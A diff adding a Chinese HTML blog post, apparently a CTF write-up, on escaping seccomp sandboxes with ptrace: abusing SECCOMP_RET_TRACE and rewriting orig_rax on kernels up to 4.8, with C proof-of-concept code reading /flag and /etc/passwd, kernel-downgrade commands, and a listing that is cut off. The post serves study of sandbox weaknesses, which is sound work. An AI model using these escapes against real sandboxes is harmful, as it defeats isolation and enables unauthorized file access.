@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="sheratan" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      ptrace在pwn中的利用 
+      
+      
+      |
+    
+     让我过六级
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img no-lazy src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">sheratan</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">ptrace在pwn中的利用</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2024-09-05 17:03:19
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="ptrace在pwn中的利用"><a href="#ptrace在pwn中的利用" class="headerlink" title="ptrace在pwn中的利用"></a>ptrace在pwn中的利用</h1><h2 id="seccomp-ret2trace"><a href="#seccomp-ret2trace" class="headerlink" title="seccomp ret2trace"></a>seccomp ret2trace</h2><p>前几天打了2024的羊城杯，其中一道pwn的沙箱没绕过去，沙箱如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x05 0x00 0x40000000  <span class="keyword">if</span> (A &gt;= 0x40000000) goto 0009</span><br><span class="line"> 0004: 0x15 0x04 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000101  <span class="keyword">if</span> (A == openat) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000142  <span class="keyword">if</span> (A == execveat) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7ff00000  <span class="built_in">return</span> TRACE</span><br></pre></td></tr></table></figure>
+<p>可以看到当检测到非法的syscall时在这里是return TRACE而不是return KILL，那么很容易想到可能会和ptrace有一定的关系，那么首先需要了解一下seccomp return TRACE到底是在干什么<br>在<a target="_blank" rel="noopener" href="https://www.kernel.org/doc/html/next/translations/zh_CN/userspace-api/seccomp_filter.html">这里</a>有提及SECCOMP_RET_TRACE</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SECCOMP_RET_TRACE:</span><br><span class="line">    当返回的时候，这个值会使得内核在执行系统调用前尝试去通知一个基于 ptrace() 的追踪器。如果没有追踪器， -ENOSYS 会返回给用户空间，并且系统调用不会执行。</span><br><span class="line">    如果追踪器通过 ptrace(PTRACE_SETOPTIONS) 请求了 PTRACE_O_TRACESECCOMP， 那么它会收到 PTRACE_EVENT_SECCOMP 通知。BPF程序返回值的 SECCOMP_RET_DATA 部分会通过 PTRACE_GETEVENTMSG 提供给追踪器。</span><br><span class="line">    追踪器可以通过改变系统调用号到-1来跳过系统调用。或者追踪器可以改变系统调用号到 一个有效值来改变请求的系统调用。如果追踪器请求跳过系统调用，那么系统调用将返回 追踪器放在返回值寄存器中的值。</span><br><span class="line">    在追踪器被通知后，seccomp检查不会再次运行。（这意味着基于seccomp的沙箱必须禁止 ptrace的使用，甚至其他沙箱进程也不行，除非非常小心；ptrace可以通过这个机制来逃逸。）</span><br></pre></td></tr></table></figure>
+<p>在文档中最后还提醒了，如果使用这种返回可以通过ptrace来进行逃逸，下面通过一个demo来验证，下面先贴出demo的代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc poc.c -o poc -lseccomp -g -w</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sec</span><span class="params">()</span>&#123;</span><br><span class="line">	scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_TRACE(<span class="number">0</span>), SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_TRACE(<span class="number">0</span>), SCMP_SYS(openat), <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> seccomp_load(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	sec();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/flag&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd:%d\n&quot;</span>,fd);</span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="type">int</span> fd = open(<span class="string">&quot;/flag&quot;</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fd:%d\n&quot;</span>,fd);</span><br><span class="line">        sendfile(<span class="number">1</span>,fd,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 附加ptrace</span></span><br><span class="line">        ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// 等待子进程停止</span></span><br><span class="line">        wait(<span class="literal">NULL</span>); </span><br><span class="line">        <span class="comment">// 设置 PTRACE_O_TRACESECCOMP</span></span><br><span class="line">        ptrace(PTRACE_SETOPTIONS, pid, <span class="literal">NULL</span>, PTRACE_O_TRACESECCOMP);</span><br><span class="line">        <span class="comment">// 子进程继续</span></span><br><span class="line">        ptrace(PTRACE_CONT, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// 等待子进程退出</span></span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// 脱离ptrace</span></span><br><span class="line">        ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>沙箱如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x04 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0009</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000101  <span class="keyword">if</span> (A == openat) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7ff00000  <span class="built_in">return</span> TRACE</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure>
+<p>下面是执行结果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./poc </span><br><span class="line">fd:-1</span><br><span class="line">fd:3</span><br><span class="line">flag&#123;this_is_a_flag!&#125;</span><br></pre></td></tr></table></figure>
+
+<p>整个过程其实也是比较简单的，首先fork一个子进程用来执行shellcode，主进程用来ptrace子进程，主进程先<code>ptrace(PTRACE_ATTACH, pid, NULL, NULL);</code>来附加子进程，接着等待子进程停止，当子进程执行到open的系统调用时就会停止并给主进程的ptrace返回TRACE，主进程收到后设置捕获类型，然后捕获到后<code>ptrace(PTRACE_CONT, pid, NULL, NULL);</code>使子进程继续执行，那么子进程就会完成open操作而完成绕过沙箱，接下来的wait是在等子进程运行完成后退出，最后取消附加完成整个利用过程。<br>最后，关于赛题利用堆风水+apple链即可达到执行shellcode的目的，利用上述方法即可绕过沙箱</p>
+<h2 id="ptrace-修改系统调用"><a href="#ptrace-修改系统调用" class="headerlink" title="ptrace 修改系统调用"></a>ptrace 修改系统调用</h2><p>首先来了解一下ptrace是怎样修改系统调用的。在做系统调用时，我们都是将系统调用号存储在rax中然后syscall触发系统调用，然而实际上系统调用号后续是存储在orig_rax中的，所以用ptrace来修改系统调用实际上就是在修改orig_rax<br>同样还是先贴出没有沙箱情况下的demo代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc poc.c -o poc -g -w</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)&#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        syscall(SYS_kill, syscall(SYS_getpid), SIGSTOP);</span><br><span class="line">        <span class="type">int</span> fd = syscall(SYS_getpid, <span class="string">&quot;/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        sendfile(<span class="number">1</span>,fd,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_SYSCALL, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (regs.orig_rax == SYS_getpid) &#123;</span><br><span class="line">        regs.orig_rax = SYS_open;</span><br><span class="line">        ptrace(PTRACE_SETREGS, pid, <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上述demo就可以将getpid的系统调用改为open，从而打开文件返回fd。<br>既然ptrace可以修改系统调用，那么是否可以bypass seccomp呢？这个是有说法的，通过查阅网上资料发现，好像是kernel&lt;&#x3D;4.8的环境中可以实现，高版本被修复了，下面通过ubuntu16.04 kernel4.4来复现。<br>首先贴出poc<a target="_blank" rel="noopener" href="https://gist.github.com/thejh/8346f47e359adecd1d53">地址</a>，同时还有一篇kernel降低版本的<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64986186/article/details/134543975">blog</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更换kernel版本</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前版本 </span></span><br><span class="line">$ <span class="built_in">uname</span> -r</span><br><span class="line">4.15.0-112-generic</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前仓库存在版本</span></span><br><span class="line">$ apt-cache search linux | grep linux-image | grep generic | grep 4.4</span><br><span class="line">linux-image-4.4.0-21-generic - Linux kernel image <span class="keyword">for</span> version 4.4.0 on 64 bit x86 SMP</span><br><span class="line">linux-image-extra-4.4.0-21-generic - Linux kernel extra modules <span class="keyword">for</span> version 4.4.0 on 64 bit x86 SMP</span><br><span class="line">linux-image-4.4.0-142-generic - Linux kernel image <span class="keyword">for</span> version 4.4.0 on 64 bit x86 SMP</span><br><span class="line">linux-image-4.4.0-186-generic - Signed kernel image generic</span><br><span class="line">linux-image-4.4.0-210-generic - Signed kernel image generic</span><br><span class="line">linux-image-extra-4.4.0-142-generic - Linux kernel extra modules <span class="keyword">for</span> version 4.4.0 on 64 bit x86 SMP</span><br><span class="line">linux-image-unsigned-4.4.0-186-generic - Linux kernel image <span class="keyword">for</span> version 4.4.0 on 64 bit x86 SMP</span><br><span class="line">linux-image-unsigned-4.4.0-210-generic - Linux kernel image <span class="keyword">for</span> version 4.4.0 on 64 bit x86 SMP</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载kernel文件</span></span><br><span class="line">$ <span class="built_in">sudo</span> apt-get install linux-image-4.4.0-21-generic linux-headers-4.4.0-21-generic</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改/etc/default/grub</span></span><br><span class="line">$ <span class="built_in">sudo</span> sed -i <span class="string">&quot;s/GRUB_DEFAULT=0/GRUB_DEFAULT=\&quot;Advanced options for Ubuntu&gt;Ubuntu, with Linux 4.4.0-21-generic\&quot;/g&quot;</span> /etc/default/grub</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新配置</span></span><br><span class="line">$ <span class="built_in">sudo</span> update-grub</span><br><span class="line">$ <span class="built_in">sudo</span> reboot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启后</span></span><br><span class="line">$ <span class="built_in">uname</span> -r</span><br><span class="line">4.4.0-21-generic</span><br></pre></td></tr></table></figure>
+<p>现在编译poc并运行得到下面的结果</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://cdn.jsdelivr.net/gh/sheratan4/picture@main/img/202409051703022.png" alt="ptrace_1"></p>
+<p>可以看到在开启沙箱后还是完成了打开文件的操作，那么在pwn中如果遇到kernel&lt;&#x3D;4.8则可以考虑使用这种方法来绕过沙箱，简化一下poc可以提取出主要步骤</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sec</span><span class="params">()</span>&#123;</span><br><span class="line">	scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(openat), <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> seccomp_load(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	sec();</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)&#123;</span><br><span class="line">        ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        syscall(SYS_kill, syscall(SYS_getpid), SIGSTOP);</span><br><span class="line">        <span class="type">int</span> fd = syscall(SYS_getpid, <span class="string">&quot;/etc/passwd&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        sendfile(<span class="number">1</span>,fd,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    waitpid(pid,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_SYSCALL, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    waitpid(pid,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (regs.orig_rax == SYS_getpid) &#123;</span><br><span class="line">        regs.orig_rax = SYS_open;</span><br><span class="line">        ptrace(PTRACE_SETREGS, pid, <span class="literal">NULL</span>, &amp;regs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对应的可以将其改为汇编，改自<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/75e157cea215">这里</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span 